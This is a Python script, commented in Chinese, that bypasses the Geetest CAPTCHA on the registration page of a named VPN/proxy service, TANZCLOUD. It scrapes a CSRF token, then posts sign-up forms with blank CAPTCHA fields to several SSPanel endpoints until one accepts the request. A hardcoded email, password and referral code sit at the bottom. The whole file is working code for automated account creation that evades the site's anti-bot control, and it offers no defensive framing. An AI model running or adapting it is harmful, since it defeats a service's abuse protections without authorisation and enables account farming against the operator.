#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
TANZCLOUD API直注册 — 绕过Geetest前端验证
直接POST注册表单，跳过前端验证码检查
"""
import requests, sys, time, os, json, io, re
try:
    sys.stdout.reconfigure(encoding='utf-8')
except:
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')

SESSION = requests.Session()
SESSION.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
})

BASE = "https://www.tanz.website"

def register(email_prefix, domain, password, nickname, code="ssfJ"):
    """尝试通过API注册"""
    print("=" * 60)
    print(f"  TANZCLOUD API注册: {email_prefix}{domain}")
    print("=" * 60)
    
    # Step 1: 访问注册页获取CSRF token和cookie
    print("[1] 获取注册页...", flush=True)
    r = SESSION.get(f"{BASE}/auth/register?code={code}", timeout=15, allow_redirects=True)
    print(f"    状态: {r.status_code}, URL: {r.url}", flush=True)
    
    # 提取CSRF token
    csrf = ""
    for pattern in [
        r'<meta name="csrf-token" content="([^"]+)"',
        r'name="_token" value="([^"]+)"',
        r'name="csrf_token" value="([^"]+)"',
        r'csrfToken = "([^"]+)"',
    ]:
        m = re.search(pattern, r.text)
        if m:
            csrf = m.group(1)
            print(f"    CSRF: {csrf[:30]}...", flush=True)
            break
    
    # Step 2: 尝试不同注册方式
    email = f"{email_prefix}{domain}"
    
    methods = [
        # 方法1: 标准POST
        {
            "url": f"{BASE}/auth/register",
            "data": {
                "email": email,
                "name": nickname,
                "passwd": password,
                "repasswd": password,
                "code": code,
                "agree": "1",
                "emailcode": "",  # 不需要邮箱验证码的SSPanel
            }
        },
        # 方法2: 带geetest字段
        {
            "url": f"{BASE}/auth/register",
            "data": {
                "email": email,
                "name": nickname,  
                "passwd": password,
                "repasswd": password,
                "code": code,
                "agree": "1",
                "geetest_challenge": "",
                "geetest_validate": "",
                "geetest_seccode": "",
            }
        },
        # 方法3: AJAX register
        {
            "url": f"{BASE}/auth/register_ajax",
            "data": {
                "email": email,
                "name": nickname,
                "passwd": password,
                "repasswd": password,
                "code": code,
            }
        },
        # 方法4: SSPanel新版API
        {
            "url": f"{BASE}/user/reg_action",
            "data": {
                "email": email,
                "name": nickname,
                "passwd": password,
                "repasswd": password,
                "code": code,
                "agree": "true"
            }
        }
    ]
    
    if csrf:
        for m in methods:
            if "_token" not in m["data"]:
                m["data"]["_token"] = csrf
    
    for i, method in enumerate(methods):
        print(f"\n[{i+2}] 尝试方式 {i+1}: {method['url']}", flush=True)
        try:
            r = SESSION.post(method["url"], data=method["data"], 
                           timeout=15, allow_redirects=True)
            print(f"    状态: {r.status_code}", flush=True)
            print(f"    跳转: {r.url}", flush=True)
            
            if r.status_code == 200:
                text = r.text[:500]
                # 检查响应
                if "reg" in r.url.lower() and "成功" in r.text[:500]:
                    print("    ✅ 注册成功!", flush=True)
                    return email, password
                elif "/user" in r.url or "/login" in r.url:
                    print("    可能成功(跳转login/user)!", flush=True)
                    return email, password
                elif "ret" in text and "1" in text[:100]:
                    print("    可能成功(ret=1)!", flush=True)
                    return email, password
                elif "邮箱" in text and ("已" in text or "存在" in text or "注册" in text):
                    print(f"    已注册或不允许: {text[:200]}", flush=True)
                else:
                    print(f"    响应: {text[:200]}", flush=True)
            elif r.status_code in [301, 302, 303]:
                print(f"    ✅ 重定向 -> {r.headers.get('Location', '')}", flush=True)
                return email, password
        except Exception as e:
            print(f"    错误: {e}", flush=True)
    
    # 方法5: 用JS ajax
    print(f"\n[{len(methods)+2}] 尝试fetch API注册...", flush=True)
    # 使用AJAX JSON注册
    ajax_urls = [
        f"{BASE}/auth/register_ajax",
        f"{BASE}/user/register",
        f"{BASE}/user/reg",
    ]
    
    for url in ajax_urls:
        try:
            r = SESSION.post(url, json={
                "email": email,
                "name": nickname,
                "passwd": password,
                "repasswd": password,
                "code": code,
                "agree": "1"
            }, headers={"Content-Type": "application/json", "Accept": "application/json"},
            timeout=15)
            print(f"    {url}: {r.status_code} {r.text[:300]}", flush=True)
        except Exception as e:
            print(f"    {url}: {e}", flush=True)
    
    return None

if __name__ == "__main__":
    result = register(
        email_prefix="mx4496f269fa",
        domain="@hotmail.com",
        password="VpnTest2026!",
        nickname="极光战士789",
        code="ssfJ"
    )
    
    if result:
        email, pwd = result
        print(f"\n{'='*60}")
        print(f"  🎉 API注册成功!")
        print(f"  {email} / {pwd}")
        print(f"{'='*60}")
    else:
        print(f"\n❌ 所有API注册方式均失败")
